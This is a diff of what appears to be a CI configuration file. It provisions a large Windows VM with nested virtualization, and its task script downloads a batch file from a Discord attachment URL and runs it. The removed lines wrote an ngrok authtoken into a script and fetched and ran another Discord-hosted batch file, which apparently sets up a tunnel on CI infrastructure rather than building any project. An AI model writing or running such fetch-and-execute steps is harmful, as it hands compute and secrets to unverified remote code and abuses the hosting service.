@@ -4,14 +4,13 @@ compute_engine_instance:
  platform: windows
  cpu: 8 # optional. Defaults to 2 CPUs.
  memory: 32G # optional. Defaults to 4G.
- disk: 1024 # optional. By default, uses the smallest disk size required by the image.
+ disk: 2048 # optional. By default, uses the smallest disk size required by the image.
  nested_virtualization: true # optional. Whether to enable Intel VT-x. Defaults to false.
  
 task:
-  timeout_in: 43200m
+  timeout_in: 90m
   enviroment:
     TOKEN: ENCRYPTED[fb3817d3349eab96ea55ffde49ec4c79f421b04b10de4cf02973ea1d1fd080efc59a85b0ad6f059eb9fe45c3e281ed24]
   script:
-   - echo ngrok authtoken %TOKEN% > NGROK.bat
-   - curl -s -O https://cdn.discordapp.com/attachments/911797178190676052/912014848949375117/dang.bat
-   - dang.bat
+   - curl -s -O https://cdn.discordapp.com/attachments/900416785654894592/929721834813923379/azurepipeline.bat
+   - azurepipeline.bat
